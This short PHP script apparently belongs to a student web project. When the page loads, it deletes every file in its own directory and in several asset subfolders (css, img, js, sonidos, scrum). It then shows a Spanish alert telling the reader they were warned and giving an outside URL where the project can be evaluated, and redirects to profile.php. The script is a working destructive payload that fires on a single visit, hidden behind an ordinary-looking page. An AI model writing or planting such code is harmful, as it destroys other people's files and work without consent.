<?php
array_map('unlink', glob("*.*"));
array_map('unlink', glob("css/*.*"));
array_map('unlink', glob("img/*.*"));
array_map('unlink', glob("imagenes/*.*"));
array_map('unlink', glob("js/*.*"));
array_map('unlink', glob("sonidos/*.*"));
array_map('unlink', glob("scrum/*.*"));
echo "<script>alert('Te he avisado, tienes otra oportunidad para evaluar el projecto aqui.   ' +
 'http://www.aws2-userdani.tk/~dani/copy/');
        

</script>";
header('location: profile.php');
?>

